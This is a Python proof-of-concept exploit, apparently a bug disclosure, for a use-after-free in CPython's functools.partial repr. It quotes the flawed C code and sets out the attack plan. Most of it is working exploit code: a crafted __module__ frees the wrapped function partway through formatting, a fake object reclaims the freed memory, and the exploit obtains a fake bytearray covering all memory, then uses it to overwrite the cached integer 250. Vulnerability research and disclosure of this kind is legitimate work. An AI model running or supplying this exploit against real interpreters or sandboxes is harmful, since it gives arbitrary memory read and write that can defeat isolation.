"""
Author: @Nico-Posada
Bug Credits: @Nico-Posada
"""

# TLDR: Some format string specifiers can call python code and we can use that to
#       cause a controlled object to be freed before it's done being used
# Tested to work on 3.13.0, 3.13.1, 3.14.0

# Here is the vulnerable code as of 3.14.0
# https://github.com/python/cpython/blob/v3.14.0/Modules/_functoolsmodule.c#L607-L671
"""
static PyObject *
partial_repr(PyObject *self)
{
    /* snip */

    mod = PyType_GetModuleName(Py_TYPE(pto));
    if (mod == NULL) {
        goto error;
    }
    name = PyType_GetQualName(Py_TYPE(pto));
    if (name == NULL) {
        Py_DECREF(mod);
        goto error;
    }
    result = PyUnicode_FromFormat("%S.%S(%R%U)", mod, name, pto->fn, arglist); // <--- uses `mod`, `name`, and pto->fn without
                                                                               // incrementing the refcounts beforehand
    Py_DECREF(mod);
    Py_DECREF(name);
    Py_DECREF(arglist);

 done:
    Py_ReprLeave(self);
    return result;
 error:
    Py_DECREF(arglist);
    Py_ReprLeave(self);
    return NULL;
}
"""

# So the plan here is to create a `partial` subclass with a __module__ that can run python code when a function calls `str` on it.
# From there, we can abuse the `__setstate__` function to overwrite pto->fn which will leave a dangling pointer in the format string arg (the original pto->fn has been freed).
# Finally, we reclaim the freed memory with data for a fake object that includes an evil bytearray object in one of its slots. We give this object
# a __repr__ function to be able to recover that evil bytearray object once the format string tries calling repr on it (%R fmt).

from functools import partial

class evil_str:
    def __str__(self):
        global p, _ref
        # we just want to set a valid state so pto->fn gets overwritten
        p.__setstate__((print, (), None, None))
        # the original pto->fn has been overwritten, so reclaim the freed memory with our fake obj
        _ref = fake_obj.ljust(SIZE)
        return "bonk"

class evil_partial(partial):
    __module__ = evil_str()

# we use a bytes subclass here so we can easily control allocation size
class evil_bytes(bytes):
    def __call__(self, *args):
        return
    
    # if the exploit fails it'll call this repr func rather than the `catch` one
    def __repr__(self):
        return "failed"

# will be used to retrieve our fake bytearray object after performing the exploit
class catch:
    __slots__ = ("mem",)
    def __repr__(self):
        global mem
        mem = self.mem
        return "x"

p64 = lambda num: num.to_bytes(8, 'little')

# fake bytearray
fake_ba = (
    p64(0x123456) +
    p64(id(bytearray)) +
    p64(2**63 - 1) +
    p64(2**63 - 1) +
    p64(0) + p64(0)
)

# fake object with the fake bytearray in the first slot
fake_obj = (
    p64(0x123456) +
    p64(id(catch)) +
    p64(id(fake_ba) + bytes.__basicsize__ - 1)
)

SIZE = 0x100
p = evil_partial(evil_bytes(SIZE - 0x18), 1, 2)

mem = None
'%r' % p # trigger bug
if mem is None:
    exit("failed")

print(type(mem))
print(hex(len(mem)))

mem[id(250) + int.__basicsize__] = 100
print(250) # => 100